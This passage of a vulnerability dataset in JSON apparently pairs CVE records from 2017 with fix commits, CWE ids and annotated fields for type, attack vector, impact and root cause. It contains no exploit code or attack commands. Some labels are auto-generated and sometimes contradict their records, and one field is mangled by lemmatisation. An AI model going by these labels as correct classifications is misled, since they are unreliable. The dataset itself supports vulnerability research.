io_ti: fix information leak in completion handler\n\nAdd missing sanity check to the bulk-in completion handler to avoid an\ninteger underflow that can be triggered by a malicious device.\n\nThis avoids leaking 128 kB of memory content from after the URB transfer\nbuffer to user space.\n\nFixes: 8c209e6782ca (\"USB: make actual_length in struct urb field u32\")\nFixes: 1da177e4c3f4 (\"Linux-2.6.12-rc2\")\nCc: stable <stable@vger.kernel.org>\t# 2.6.30\nSigned-off-by: Johan Hovold <johan@kernel.org>","summary":"The edge_bulk_in_callback function in drivers\/usb\/serial\/io_ti.c in the Linux kernel before 4.10.4 allows local users to obtain sensitive information (in the dmesg ringbuffer and syslog) from uninitialized kernel memory by using a crafted USB device (posing as an io_ti USB serial device) to trigger an integer underflow.","commit_message_1":"serial : io_ti : fix information leak in completion handler add missing sanity check to the bulk-in completion handler to avoid an integer underflow that can be triggered by a malicious device","Vulnerability Type":"Integer Underflow","Attack Vector":"by using a crafted usb device ( posing as an io _ ti usb serial device ) to trigger an integer underflow","Impact":"obtain sensitive information","Root Cause":"caused by an integer overflow","Attack Type":"local attacker"},{"commit_id":"82167c144a322cc956da45407f6dce8d4303d346","cve_id":"CVE-2017-8891","cwe_id":"CWE-1187","commit_message":"fix #87 : always check that threads_required set up the appropriate number of threads---fire off nop functions on unused threads for consistency","summary":"Dropbox Lepton 1.2.1 allows DoS (SEGV and application crash) via a malformed lepton file because the code does not ensure setup of a correct number of threads.","commit_message_1":"always check that threads_required set up the appropriate number of thread -- -fire off nop function on unused thread for consistency","Vulnerability Type":"Use of Uninitialized Resource","Attack Vector":"by using a specially-crafted lepton file","Impact":"cause a denial of service","Root Cause":"caused by the failure to ensure setup of a correct number of threads","Attack Type":"remote attacker"},{"commit_id":"657831ffc38e30092a2d5f03d385d710eb88b09a","cve_id":"CVE-2017-8890","cwe_id":"CWE-415","commit_message":"dccp\/tcp: do not inherit mc_list from parent\n\nsyzkaller found a way to trigger double frees from ip_mc_drop_socket()\n\nIt turns out that leave a copy of parent mc_list at accept() time,\nwhich is very bad.\n\nVery similar to commit 8b485ce69876 (\"tcp: do not inherit\nfastopen_req from parent\")\n\nInitial report from Pray3r, completed by Andrey one.\nThanks a lot to them !\n\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nReported-by: Pray3r <pray3r.z@gmail.com>\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nTested-by: Andrey Konovalov <andreyknvl@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The inet_csk_clone_lock function in net\/ipv4\/inet_connection_sock.c in the Linux kernel through 4.10.15 allows attackers to cause a denial of service (double free) or possibly have unspecified other impact by leveraging use of the accept system call.","commit_message_1":"do not inherit mc_list from parent syzkaller found a way to trigger double free from ip_mc_drop_socket ( ) it turn out that leave a copy of parent mc_list at accept ( ) time , which is very bad","Vulnerability Type":"double free","Attack Vector":"by leveraging use of the accept system call","Impact":"cause a denial of service ( double free ) or possibly have unspecified other impact","Root Cause":"caused by a double free","Attack Type":"attacker"},{"commit_id":"354dd3924a2e43806774953de536257548b5002c","cve_id":"CVE-2017-8831","cwe_id":"CWE-125","commit_message":"[PATCH] saa7164: Bug - Double fetch PCIe access condition\n\nAvoid a double fetch by reusing the values from the prior transfer.\n\nOriginally reported via https:\/\/bugzilla.kernel.org\/show_bug.cgi?id=195559\n\nThanks to Pengfei Wang <wpengfeinudt@gmail.com> for reporting.\n\nSigned-off-by: Steven Toth <stoth@kernellabs.com>","summary":"The saa7164_bus_get function in drivers\/media\/pci\/saa7164\/saa7164-bus.c in the Linux kernel through 4.11.5 allows local users to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact by changing a certain sequence-number value, aka a *double fetch* vulnerability.","commit_message_1":"bug - double fetch pcie access condition avoid a double fetch by reusing the value from the prior transfer","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"by changing a certain sequence - number value , aka a * double fetch * vulnerability ","Impact":"cause a denial of service ( out - of - bounds array access ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds array access","Attack Type":"local attacker"},{"commit_id":"1fe8fbc032ccda1db9af66d93016b49c16c1f22d","cve_id":"CVE-2017-8825","cwe_id":"CWE-476","commit_message":"Fixed crash #274","summary":"A null dereference vulnerability has been found in the MIME handling component of LibEtPan before 1.8, as used in MailCore and MailCore 2. A crash can occur in low-level\/imf\/mailimf.c during a failed parse of a Cc header containing multiple e-mail addresses.","commit_message_1":"fixed crash # <number>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"When a failed parse of a Cc header containing multiple e-mail addresses occurs","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"176f8a075a963ffbfa56f1c460c15f6a1a6af5a7","cve_id":"CVE-2017-8807","cwe_id":"CWE-119","commit_message":"Avoid buffer read overflow on vcl_error and -sfile\n\nThe file stevedore may return a buffer larger than asked for when\nrequesting storage. Due to lack of check for this condition, the code\nto copy the synthetic error memory buffer from vcl_error would overrun\nthe buffer.\n\nPatch by @shamger\n\nFixes: #2429","summary":"vbf_stp_error in bin\/varnishd\/cache\/cache_fetch.c in Varnish HTTP Cache 4.1.x before 4.1.9 and 5.x before 5.2.1 allows remote attackers to obtain sensitive information from process memory because a VFP_GetStorage buffer is larger than intended in certain circumstances involving -sfile Stevedore transient objects.","commit_message_1":"avoid buffer read overflow on vcl_error and -sfile the file stevedore may return a buffer larger than asked for when requesting storage","Vulnerability Type":"buffer overflow","Attack Vector":"in certain circumstances involving -sfile Stevedore transient objects","Impact":"obtain sensitive information from process memory because a vfp _ getstorage buffer is larger than intended in certain circumstances involving - sfile stevedore transient objects","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"b550a32e60a4941994b437a8d662432a486235a5","cve_id":"CVE-2017-8797","cwe_id":"CWE-129","commit_message":"nfsd: fix undefined behavior in nfsd4_layout_verify\n\n  UBSAN: Undefined behaviour in fs\/nfsd\/nfs4proc.c:1262:34\n  shift exponent 128 is too large for 32-bit type 'int'\n\nDepending on compiler+architecture, this may cause the check for\nlayout_type to succeed for overly large values (which seems to be the\ncase with amd64). The large value will be later used in de-referencing\nnfsd4_layout_ops for function pointers.\n\nReported-by: Jani Tuovila <tuovila@synopsys.com>\nSigned-off-by: Ari Kauppi <ari@synopsys.com>\n[colin.king@canonical.com: use LAYOUT_TYPE_MAX instead of 32]\nCc: stable@vger.kernel.org\nReviewed-by: Dan Carpenter <dan.carpenter@oracle.com>\nReviewed-by: Christoph Hellwig <hch@lst.de>\nSigned-off-by: J. Bruce Fields <bfields@redhat.com>","summary":"The NFSv4 server in the Linux kernel before 4.11.3 does not properly validate the layout type when processing the NFSv4 pNFS GETDEVICEINFO or LAYOUTGET operand in a UDP packet from a remote attacker. This type value is uninitialized upon encountering certain error conditions. This value is used as an array index for dereferencing, which leads to an OOPS and eventually a DoS of knfsd and a soft-lockup of the whole system.","commit_message_1":"fix undefined behavior in nfsd4_layout_verify ubsan : undefined behaviour in fs\/nfsd\/<file> : <number> : <number> shift exponent <number> is too large for <number>-bit type 'int ' depending on compiler+architecture , this may cause the check for layout_type to succeed for overly large value ( which seems to be the case with amd64 )","Vulnerability Type":"Improper Validation of Array Index","Attack Vector":"By sending a specially crafted NFSv4 pNFS LAYOUTGET command using UDP","Impact":"cause a denial of service","Root Cause":"does not properly validate the layout type when processing the nfsv4 pnfs getdeviceinfo or layoutget operand","Attack Type":"remote attacker"},{"commit_id":"a00183107d4b84bc8a714290e824ca9c68dac738","cve_id":"CVE-2017-8326","cwe_id":"CWE-682","commit_message":"Trying to fix some invalid left shift operations\n\nFixes issue #16","summary":"libimageworsener.a in ImageWorsener before 1.3.1 has *left shift cannot be represented in type int* undefined behavior issues, which might allow remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a crafted image, related to imagew-bmp.c and imagew-util.c.","commit_message_1":"trying to fix some invalid left shift operation","Vulnerability Type":"Incorrect Calculation","Attack Vector":"via a crafted image , related to imagew - bmp . c and imagew - util . c","Impact":"cause a denial of service","Root Cause":"has * left shift cannot be represented","Attack Type":"remote attacker"},{"commit_id":"83d799804648c2a0895d40a19835d9b757c6fa4e","cve_id":"CVE-2017-8294","cwe_id":"CWE-125","commit_message":"Fix issue #646 (#648)\n\n* Fix issue #646 and some edge cases with wide regexps using \\b and \\B\n\n* Rename function IS_WORD_CHAR to _yr_re_is_word_char","summary":"libyara\/re.c in the regex component in YARA 3.5.0 allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via a crafted rule that is mishandled in the yr_re_exec function.","commit_message_1":"fix issue # <number> ( # <number> )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted rule that is mishandled in the yr _ re _ exec function","Impact":"cause a denial of service ( out - of - bounds read and application crash )","Root Cause":"caused by an out of bounds read","Attack Type":"remote attacker"},{"commit_id":"30663fd26c0307e414622c7a8607fbc04f92ec14","cve_id":"CVE-2017-8284","cwe_id":"CWE-94","commit_message":"tcg\/i386: Check the size of instruction being translated\n\nThis fixes the bug: 'user-to-root privesc inside VM via bad translation\ncaching' reported by Jann Horn here:\nhttps:\/\/bugs.chromium.org\/p\/project-zero\/issues\/detail?id=1122\n\nReviewed-by: Richard Henderson <rth@twiddle.net>\nCC: Peter Maydell <peter.maydell@linaro.org>\nCC: Paolo Bonzini <pbonzini@redhat.com>\nReported-by: Jann Horn <jannh@google.com>\nSigned-off-by: Pranith Kumar <bobby.prani@gmail.com>\nMessage-Id: <20170323175851.14342-1-bobby.prani@gmail.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"** DISPUTED ** The disas_insn function in target\/i386\/translate.c in QEMU before 2.9.0, when TCG mode without hardware acceleration is used, does not limit the instruction size, which allows local users to gain privileges by creating a modified basic block that injects code into a setuid program, as demonstrated by procmail. NOTE: the vendor has stated *this bug does not violate any security guarantees QEMU makes.*","commit_message_1":"check the size of instruction being translated this fix the bug : 'user-to-root privesc inside vm via bad translation caching ' reported by jann horn here : http : \/\/<file>","Vulnerability Type":"Code Injection","Attack Vector":"by creating a modified basic block that injects code into a setuid program , as demonstrated by procmail","Impact":"gain privileges","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"2fb346f25f79e412cf0ed314fdf791763c19b70b","cve_id":"CVE-2017-8073","cwe_id":"CWE-119","commit_message":"irc: fix parsing of DCC filename","summary":"WeeChat before 1.7.1 allows a remote crash by sending a filename via DCC to the IRC plugin. This occurs in the irc_ctcp_dcc_filename_without_quotes function during quote removal, with a buffer overflow.","commit_message_1":"irc : fix parsing of dcc filename","Vulnerability Type":"buffer overflow","Attack Vector":"via dcc to the irc plugin","Impact":"cause a denial of service","Root Cause":"caused by buffer overflow","Attack Type":"remote attacker"},{"commit_id":"8e9faa15469ed7c7467423db4c62aeed3ff4cae3","cve_id":"CVE-2017-8072","cwe_id":"CWE-388","commit_message":"HID: cp2112: fix gpio-callback error handling\n\nIn case of a zero-length report, the gpio direction_input callback would\ncurrently return success instead of an errno.\n\nFixes: 1ffb3c40ffb5 (\"HID: cp2112: make transfer buffers DMA capable\")\nCc: stable <stable@vger.kernel.org>     # 4.9\nSigned-off-by: Johan Hovold <johan@kernel.org>\nReviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>","summary":"The cp2112_gpio_direction_input function in drivers\/hid\/hid-cp2112.c in the Linux kernel 4.9.x before 4.9.9 does not have the expected EIO error status for a zero-length report, which allows local users to have an unspecified impact via unknown vectors.","commit_message_1":"cp2112 : fix gpio-callback error handling in case of a zero-length report , the gpio direction_input callback would currently return success instead of an errno","Vulnerability Type":"7PK - Errors","Attack Vector":"none","Impact":"none","Root Cause":"does not have the expected eio error status for a zero - length report","Attack Type":"local attacker"},{"commit_id":"7a7b5df84b6b4e5d599c7289526eed96541a0654","cve_id":"CVE-2017-8071","cwe_id":"CWE-404","commit_message":"HID: cp2112: fix sleep-while-atomic\n\nA recent commit fixing DMA-buffers on stack added a shared transfer\nbuffer protected by a spinlock. This is broken as the USB HID request\ncallbacks can sleep. Fix this up by replacing the spinlock with a mutex.\n\nFixes: 1ffb3c40ffb5 (\"HID: cp2112: make transfer buffers DMA capable\")\nCc: stable <stable@vger.kernel.org>\t# 4.9\nSigned-off-by: Johan Hovold <johan@kernel.org>\nReviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>","summary":"drivers\/hid\/hid-cp2112.c in the Linux kernel 4.9.x before 4.9.9 uses a spinlock without considering that sleeping is possible in a USB HID request callback, which allows local users to cause a denial of service (deadlock) via unspecified vectors.","commit_message_1":"cp2112 : fix sleep-while-atomic a recent commit fixing dma-buffers on stack added a shared transfer buffer protected by a spinlock","Vulnerability Type":"Improper Resource Shutdown or Release","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service","Root Cause":"uses a spinlock without considering that sleeping is possible","Attack Type":"local attacker"},{"commit_id":"2d6a0e9de03ee658a9adc3bfb2f0ca55dff1e478","cve_id":"CVE-2017-8070","cwe_id":"CWE-119","commit_message":"catc: Use heap buffer for memory size test\n\nAllocating USB buffers on the stack is not portable, and no longer\nworks on x86_64 (with VMAP_STACK enabled as per default).\n\nFixes: 1da177e4c3f4 (\"Linux-2.6.12-rc2\")\nSigned-off-by: Ben Hutchings <ben@decadent.org.uk>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"drivers\/net\/usb\/catc.c in the Linux kernel 4.9.x before 4.9.11 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","commit_message_1":"use heap buffer for memory size test allocating usb buffer on the stack is not portable , and no longer work on x86_64 ( with vmap_stack enabled a per default )","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging use of more than one virtual page for a dma scatterlist ","Impact":"cause a denial of service ( system crash or memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"7926aff5c57b577ab0f43364ff0c59d968f6a414","cve_id":"CVE-2017-8069","cwe_id":"CWE-119","commit_message":"rtl8150: Use heap buffers for all register access\n\nAllocating USB buffers on the stack is not portable, and no longer\nworks on x86_64 (with VMAP_STACK enabled as per default).\n\nFixes: 1da177e4c3f4 (\"Linux-2.6.12-rc2\")\nSigned-off-by: Ben Hutchings <ben@decadent.org.uk>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"drivers\/net\/usb\/rtl8150.c in the Linux kernel 4.9.x before 4.9.11 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","commit_message_1":"use heap buffer for all register access allocating usb buffer on the stack is not portable , and no longer work on x86_64 ( with vmap_stack enabled a per default )","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging use of more than one virtual page for a dma scatterlist ","Impact":"cause a denial of service ( system crash or memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"5593523f968bc86d42a035c6df47d5e0979b5ace","cve_id":"CVE-2017-8068","cwe_id":"CWE-119","commit_message":"pegasus: Use heap buffers for all register access\n\nAllocating USB buffers on the stack is not portable, and no longer\nworks on x86_64 (with VMAP_STACK enabled as per default).\n\nFixes: 1da177e4c3f4 (\"Linux-2.6.12-rc2\")\nReferences: https:\/\/bugs.debian.org\/852556\nReported-by: Lisandro Dami\u00e1n Nicanor P\u00e9rez Meyer <lisandro@debian.org>\nTested-by: Lisandro Dami\u00e1n Nicanor P\u00e9rez Meyer <lisandro@debian.org>\nSigned-off-by: Ben Hutchings <ben@decadent.org.uk>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"drivers\/net\/usb\/pegasus.c in the Linux kernel 4.9.x before 4.9.11 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","commit_message_1":"use heap buffer for all register access allocating usb buffer on the stack is not portable , and no longer work on x86_64 ( with vmap_stack enabled a per default )","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging use of more than one virtual page for a dma scatterlist ","Impact":"cause a denial of service ( system crash or memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"c4baad50297d84bde1a7ad45e50c73adae4a2192","cve_id":"CVE-2017-8067","cwe_id":"CWE-119","commit_message":"virtio-console: avoid DMA from stack\n\nput_chars() stuffs the buffer it gets into an sg, but that buffer may be\non the stack. This breaks with CONFIG_VMAP_STACK=y (for me, it\nmanifested as printks getting turned into NUL bytes).\n\nSigned-off-by: Omar Sandoval <osandov@fb.com>\nSigned-off-by: Michael S. Tsirkin <mst@redhat.com>\nReviewed-by: Amit Shah <amit.shah@redhat.com>","summary":"drivers\/char\/virtio_console.c in the Linux kernel 4.9.x and 4.10.x before 4.10.12 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","commit_message_1":"avoid dma from stack put_chars ( ) stuff the buffer it get into an sg , but that buffer may be on the stack","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging use of more than one virtual page for a dma scatterlist ","Impact":"cause a denial of service ( system crash or memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"c919a3069c775c1c876bec55e00b2305d5125caa","cve_id":"CVE-2017-8066","cwe_id":"CWE-119","commit_message":"can: gs_usb: Don't use stack memory for USB transfers\n\nFixes: 05ca5270005c can: gs_usb: add ethtool set_phys_id callback to locate physical device\n\nThe gs_usb driver is performing USB transfers using buffers allocated on\nthe stack. This causes the driver to not function with vmapped stacks.\nInstead, allocate memory for the transfer buffers.\n\nSigned-off-by: Ethan Zonca <e@ethanzonca.com>\nCc: linux-stable <stable@vger.kernel.org> # >= v4.8\nSigned-off-by: Marc Kleine-Budde <mkl@pengutronix.de>","summary":"drivers\/net\/can\/usb\/gs_usb.c in the Linux kernel 4.9.x and 4.10.x before 4.10.2 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","commit_message_1":"gs_usb : do n't use stack memory for usb transfer the gs_usb driver is performing usb transfer using buffer allocated on the stack","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging use of more than one virtual page for a dma scatterlist ","Impact":"cause a denial of service ( system crash or memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"3b30460c5b0ed762be75a004e924ec3f8711e032","cve_id":"CVE-2017-8065","cwe_id":"CWE-119","commit_message":"crypto: ccm - move cbcmac input off the stack\n\nCommit f15f05b0a5de (\"crypto: ccm - switch to separate cbcmac driver\")\nrefactored the CCM driver to allow separate implementations of the\nunderlying MAC to be provided by a platform. However, in doing so, it\nmoved some data from the linear region to the stack, which violates the\nSG constraints when the stack is virtually mapped.\n\nSo move idata\/odata back to the request ctx struct, of which we can\nreasonably expect that it has been allocated using kmalloc() et al.\n\nReported-by: Johannes Berg <johannes@sipsolutions.net>\nFixes: f15f05b0a5de (\"crypto: ccm - switch to separate cbcmac driver\")\nSigned-off-by: Ard Biesheuvel <ard.biesheuvel@linaro.org>\nTested-by: Johannes Berg <johannes@sipsolutions.net>\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>","summary":"crypto\/ccm.c in the Linux kernel 4.9.x and 4.10.x through 4.10.12 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","commit_message_1":"ccm - move cbcmac input off the stack commit f15f05b0a5de ( `` crypto : ccm - switch to separate cbcmac driver '' ) refactored the ccm driver to allow separate implementation of the underlying mac to be provided by a platform","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging use of more than one virtual page for a dma scatterlist ","Impact":"cause a denial of service ( system crash or memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"005145378c9ad7575a01b6ce1ba118fb427f583a","cve_id":"CVE-2017-8064","cwe_id":"CWE-119","commit_message":"[media] dvb-usb-v2: avoid use-after-free\n\nI ran into a stack frame size warning because of the on-stack copy of\nthe USB device structure:\n\ndrivers\/media\/usb\/dvb-usb-v2\/dvb_usb_core.c: In function 'dvb_usbv2_disconnect':\ndrivers\/media\/usb\/dvb-usb-v2\/dvb_usb_core.c:1029:1: error: the frame size of 1104 bytes is larger than 1024 bytes [-Werror=frame-larger-than=]\n\nCopying a device structure like this is wrong for a number of other reasons\ntoo aside from the possible stack overflow. One of them is that the\ndev_info() call will print the name of the device later, but AFAICT\nwe have only copied a pointer to the name earlier and the actual name\nhas been freed by the time it gets printed.\n\nThis removes the on-stack copy of the device and instead copies the\ndevice name using kstrdup(). I'm ignoring the possible failure here\nas both printk() and kfree() are able to deal with NULL pointers.\n\nSigned-off-by: Arnd Bergmann <arnd@arndb.de>\nSigned-off-by: Mauro Carvalho Chehab <mchehab@s-opensource.com>","summary":"drivers\/media\/usb\/dvb-usb-v2\/dvb_usb_core.c in the Linux kernel 4.9.x and 4.10.x before 4.10.12 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","commit_message_1":"avoid use-after-free i ran into a stack frame size warning because of the on-stack copy of the usb device structure : drivers\/media\/usb\/dvb-usb-v2\/<file> : in function 'dvb_usbv2_disconnect ' : drivers\/media\/usb\/dvb-usb-v2\/<file> : <number> : <number> : error : the frame size of <number> byte is larger than <number> byte [ -werror=frame-larger-than= ] copying a device structure like this is wrong for a number of other reason too aside from the possible stack overflow","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging use of more than one virtual page for a dma scatterlist ","Impact":"cause a denial of service ( system crash or memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"3f190e3aec212fc8c61e202c51400afa7384d4bc","cve_id":"CVE-2017-8063","cwe_id":"CWE-119","commit_message":"[media] cxusb: Use a dma capable buffer also for reading\n\nCommit 17ce039b4e54 (\"[media] cxusb: don't do DMA on stack\")\nadded a kmalloc'ed bounce buffer for writes, but missed to do the same\nfor reads. As the read only happens after the write is finished, we can\nreuse the same buffer.\n\nAs dvb_usb_generic_rw handles a read length of 0 by itself, avoid calling\nit using the dvb_usb_generic_read wrapper function.\n\nSigned-off-by: Stefan Br\u00fcns <stefan.bruens@rwth-aachen.de>\nSigned-off-by: Mauro Carvalho Chehab <mchehab@s-opensource.com>","summary":"drivers\/media\/usb\/dvb-usb\/cxusb.c in the Linux kernel 4.9.x and 4.10.x before 4.10.12 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","commit_message_1":"use a dma capable buffer also for reading commit 17ce039b4e54 ( `` [ medium ] cxusb : do n't do dma on stack '' ) added a kmalloc'ed bounce buffer for writes , but missed to do the same for read","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging use of more than one virtual page for a dma scatterlist ","Impact":"cause a denial of service ( system crash ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"606142af57dad981b78707234cfbd15f9f7b7125","cve_id":"CVE-2017-8062","cwe_id":"CWE-119","commit_message":"[media] dw2102: don't do DMA on stack\n\nOn Kernel 4.9, WARNINGs about doing DMA on stack are hit at\nthe dw2102 driver: one in su3000_power_ctrl() and the other in tt_s2_4600_frontend_attach().\n\nBoth were due to the use of buffers on the stack as parameters to\ndvb_usb_generic_rw() and the resulting attempt to do DMA with them.\n\nThe device was non-functional as a result.\n\nSo, switch this driver over to use a buffer within the device state\nstructure, as has been done with other DVB-USB drivers.\n\nTested with TechnoTrend TT-connect S2-4600.\n\n[mchehab@osg.samsung.com: fixed a warning at su3000_i2c_transfer() that\n state var were dereferenced before check 'd']\nSigned-off-by: Jonathan McDowell <noodles@earth.li>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Mauro Carvalho Chehab <mchehab@s-opensource.com>","summary":"drivers\/media\/usb\/dvb-usb\/dw2102.c in the Linux kernel 4.9.x and 4.10.x before 4.10.4 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","commit_message_1":"do n't do dma on stack on kernel <file> , warning about doing dma on stack are hit at the dw2102 driver : one in su3000_power_ctrl ( ) and the other in tt_s2_4600_frontend_attach ( )","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging use of more than one virtual page for a dma scatterlist ","Impact":"cause a denial of service ( system crash or memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"67b0503db9c29b04eadfeede6bebbfe5ddad94ef","cve_id":"CVE-2017-8061","cwe_id":"CWE-119","commit_message":"[media] dvb-usb-firmware: don't do DMA on stack\n\nThe buffer allocation for the firmware data was changed in\ncommit 43fab9793c1f (\"[media] dvb-usb: don't use stack for firmware load\")\nbut the same applies for the reset value.\n\nFixes: 43fab9793c1f (\"[media] dvb-usb: don't use stack for firmware load\")\nCc: stable@vger.kernel.org\nSigned-off-by: Stefan Br\u00fcns <stefan.bruens@rwth-aachen.de>\nSigned-off-by: Mauro Carvalho Chehab <mchehab@s-opensource.com>","summary":"drivers\/media\/usb\/dvb-usb\/dvb-usb-firmware.c in the Linux kernel 4.9.x and 4.10.x before 4.10.7 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","commit_message_1":"do n't do dma on stack the buffer allocation for the firmware data wa changed in commit 43fab9793c1f ( `` [ medium ] dvb-usb : do n't use stack for firmware load '' ) but the same applies for the reset value","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging use of more than one virtual page for a dma scatterlist ","Impact":"cause a denial of service ( system crash or memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"ca3356eb49fee03e2eaf6b6aff826988c1122d93","cve_id":"CVE-2017-7962","cwe_id":"CWE-369","commit_message":"Fixed a GIF decoding bug (divide by zero)\n\nFixes issue #15","summary":"The iwgif_read_image function in imagew-gif.c in libimageworsener.a in ImageWorsener 1.3.0 allows remote attackers to cause a denial of service (divide-by-zero error and application crash) via a crafted file.","commit_message_1":"fixed a gif decoding bug ( divide by zero )","Vulnerability Type":"Divide By Zero","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( divide - by - zero error and application crash )","Root Cause":"caused by a divide-by-zero error","Attack Type":"remote attacker"},{"commit_id":"d1e8ac62c6d978d4662f69116e30230d43033c92","cve_id":"CVE-2017-7946","cwe_id":"CWE-416","commit_message":"Fix null deref and uaf in mach0 parser","summary":"The get_relocs_64 function in libr\/bin\/format\/mach0\/mach0.c in radare2 1.3.0 allows remote attackers to cause a denial of service (use-after-free and application crash) via a crafted Mach0 file.","commit_message_1":"fix null deref and uaf in mach0 parser","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted mach0 file","Impact":"cause a denial of service ( use - after - free and application crash )","Root Cause":"caused by use-after-free","Attack Type":"remote attacker"},{"commit_id":"13bf9fbff0e5e099e2b6f003a0ab8ae145436309","cve_id":"CVE-2017-7895","cwe_id":"CWE-119","commit_message":"nfsd: stricter decoding of write-like NFSv2\/v3 ops\n\nThe NFSv2\/v3 code does not systematically check whether we decode past\nthe end of the buffer.  This generally appears to be harmless, but there\nare a few places where we do arithmetic on the pointers involved and\ndon't account for the possibility that a length could be negative.  Add\nchecks to catch these.\n\nReported-by: Tuomas Haanp\u00e4\u00e4 <thaan@synopsys.com>\nReported-by: Ari Kauppi <ari@synopsys.com>\nReviewed-by: NeilBrown <neilb@suse.com>\nCc: stable@vger.kernel.org\nSigned-off-by: J. Bruce Fields <bfields@redhat.com>","summary":"The NFSv2 and NFSv3 server implementations in the Linux kernel through 4.10.13 lack certain checks for the end of a buffer, which allows remote attackers to trigger pointer-arithmetic errors or possibly have unspecified other impact via crafted requests, related to fs\/nfsd\/nfs3xdr.c and fs\/nfsd\/nfsxdr.c.","commit_message_1":"stricter decoding of write-like nfsv2\/v3 ops the nfsv2\/v3 code doe not systematically check whether we decode past the end of the buffer","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted requests , related to fs \/ nfsd \/ nfs3xdr . c and fs \/ nfsd \/ nfsxdr . c","Impact":"trigger pointer - arithmetic errors or possibly have unspecified other impact","Root Cause":"lack certain checks for the end of a buffer","Attack Type":"remote attacker"},{"commit_id":"a4866aa812518ed1a37d8ea0c881dc946409de94","cve_id":"CVE-2017-7889","cwe_id":"CWE-732","commit_message":"mm: Tighten x86 \/dev\/mem with zeroing reads\n\nUnder CONFIG_STRICT_DEVMEM, reading System RAM through \/dev\/mem is\ndisallowed. However, on x86, the first 1MB was always allowed for BIOS\nand similar things, regardless of it actually being System RAM. It was\npossible for heap to end up getting allocated in low 1MB RAM, and then\nread by things like x86info or dd, which would trip hardened usercopy:\n\nusercopy: kernel memory exposure attempt detected from ffff880000090000 (dma-kmalloc-256) (4096 bytes)\n\nThis changes the x86 exception for the low 1MB by reading back zeros 